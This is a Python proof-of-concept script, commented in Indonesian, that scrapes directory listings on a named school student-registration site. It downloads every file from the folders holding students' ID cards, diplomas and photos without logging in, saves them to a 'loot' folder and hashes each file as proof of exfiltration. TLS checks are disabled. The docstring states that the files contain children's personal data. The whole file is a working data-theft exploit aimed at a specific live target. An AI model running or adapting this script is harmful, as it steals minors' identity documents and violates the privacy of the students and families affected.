#!/usr/bin/env python3
"""
PoC F1 (exfil) — SISWA MGKB · masuk ke folder unggahan siswa dan UNDUH isinya TANPA login.

Bukan checker. Script ini benar-benar:
  1. Masuk ke URL folder (files/files_ktp, files/files_ijazah, files/files_fotosiswa)
     dan membaca daftar berkasnya (directory listing).
  2. Mengunduh setiap berkas ke disk (streaming), menyimpan apa adanya.
  3. Menghitung ukuran + SHA-256 tiap berkas sebagai bukti integritas.
  4. (opsional) menyusun manifest hasil.

Semua tanpa cookie/kredensial apa pun.

Pemakaian:
  python3 poc_f1_pii_exfil.py
  python3 poc_f1_pii_exfil.py --out ./loot_f1
  python3 poc_f1_pii_exfil.py --only files_ktp,files_ijazah     # pilih folder
  python3 poc_f1_pii_exfil.py --limit 5                          # batasi (uji cepat)
  python3 poc_f1_pii_exfil.py --manifest evidence.txt --redact   # manifest nama diredact

Catatan: berkas berisi PII anak. Unduh hanya ke lingkungan terkendali; jangan
sebar. PoC ini menyimpan apa adanya untuk membuktikan eksfiltrasi nyata.
"""

import argparse
import hashlib
import os
import re
import ssl
import sys
import urllib.parse
import urllib.request

DEFAULT_BASE = "https://pcmgkb.my.id/siswamugeb"
PII_DIRS = ["files/files_ktp", "files/files_ijazah", "files/files_fotosiswa"]
HREF = re.compile(r'href="([^"?][^"]*\.(?:jpg|jpeg|png|pdf|webp|gif|bmp|zip|doc|docx|xls|xlsx))"', re.I)

MAGIC = {b"\xff\xd8\xff": "JPEG", b"\x89PNG": "PNG", b"%PDF": "PDF", b"GIF8": "GIF", b"RIFF": "WEBP", b"PK\x03\x04": "ZIP"}

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE


def open_url(url, rng=None):
    h = {"User-Agent": "Mozilla/5.0 (F1-exfil)"}
    if rng:
        h["Range"] = rng
    return urllib.request.urlopen(urllib.request.Request(url, headers=h), timeout=30, context=CTX)


def list_folder(url):
    """Masuk ke folder, kembalikan daftar nama berkas dari directory listing."""
    try:
        with open_url(url) as r:
            html = r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        print(f"   [!] listing gagal {url} -> HTTP {e.code}")
        return []
    names = [urllib.parse.unquote(x.rsplit("/", 1)[-1]) for x in HREF.findall(html)]
    return names


def download(url, dest):
    """Unduh streaming ke dest. Kembalikan (bytes, sha256, magic) atau None bila gagal."""
    h = hashlib.sha256()
    n = 0
    head = b""
    try:
        with open_url(url) as r:
            if r.status != 200:
                return None
            with open(dest, "wb") as fh:
                while True:
                    chunk = r.read(65536)
                    if not chunk:
                        break
                    if len(head) < 4:
                        head += chunk[: 4 - len(head)]
                    h.update(chunk)
                    n += len(chunk)
                    fh.write(chunk)
    except urllib.error.HTTPError as e:
        print(f"   [!] gagal {url} -> HTTP {e.code}")
        return None
    except Exception as e:  # noqa: BLE001
        print(f"   [!] gagal {url} -> {e}")
        return None
    magic = next((v for k, v in MAGIC.items() if head.startswith(k)), None)
    return n, h.hexdigest(), magic


def redact(name):
    b = name.rsplit("/", 1)[-1]
    return (b[:2] + "…" + b[-4:]) if len(b) >= 6 else "<redacted>"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base-url", default=DEFAULT_BASE)
    ap.add_argument("--out", default="./loot_f1")
    ap.add_argument("--only", help="substring folder, pisah koma (mis. files_ktp,files_ijazah)")
    ap.add_argument("--limit", type=int, default=0, help="maks berkas per folder (0 = semua)")
    ap.add_argument("--manifest", help="tulis manifest hasil ke berkas")
    ap.add_argument("--redact", action="store_true", help="sensor nama berkas di manifest")
    args = ap.parse_args()
    base = args.base_url.rstrip("/")

    dirs = PII_DIRS
    if args.only:
        keys = [k.strip() for k in args.only.split(",")]
        dirs = [d for d in PII_DIRS if any(k in d for k in keys)]
    os.makedirs(args.out, exist_ok=True)

    print(f"[*] Target    : {base}")
    print(f"[*] Simpan ke : {os.path.abspath(args.out)}")
    print(f"[*] Kredensial: TIDAK ADA (tanpa cookie, tanpa login)\n")

    manifest = [f"# Manifest exfil F1 — {base}", f"# folder: {', '.join(dirs)}", ""]
    total_files = 0
    total_bytes = 0
    for d in dirs:
        url = f"{base}/{d}/"
        print(f"== masuk folder: {url}")
        names = list_folder(url)
        if args.limit:
            names = names[: args.limit]
        print(f"   ditemukan {len(names)} berkas\n")
        savedir = os.path.join(args.out, d)
        os.makedirs(savedir, exist_ok=True)
        for name in names:
            dst = os.path.join(savedir, name)
            fu = f"{base}/{d}/{urllib.parse.quote(name)}"
            res = download(fu, dst)
            if res is None:
                if os.path.exists(dst):
                    os.remove(dst)
                continue
            nbytes, sha, magic = res
            total_files += 1
            total_bytes += nbytes
            shown = redact(name) if args.redact else name
            print(f"   [OK] {shown:<32} {nbytes:>9} bytes  {magic or '?':<4}  sha256={sha[:16]}…")
            manifest.append(f"{d}/{shown}\t{nbytes}\t{magic or '?'}\t{sha}")
        print()

    mb = total_bytes / (1024 * 1024)
    print(f"[+] Terunduh: {total_files} berkas, {total_bytes} bytes ({mb:.2f} MiB) — TANPA autentikasi.")
    print(f"[+] Tersimpan di: {os.path.abspath(args.out)}")
    manifest.append("")
    manifest.append(f"# TOTAL {total_files} berkas, {total_bytes} bytes ({mb:.2f} MiB)")
    if args.manifest:
        with open(args.manifest, "w", encoding="utf-8") as fh:
            fh.write("\n".join(manifest) + "\n")
        print(f"[+] Manifest: {args.manifest}")
    return 0 if total_files == 0 else 2


if __name__ == "__main__":
    sys.exit(main())
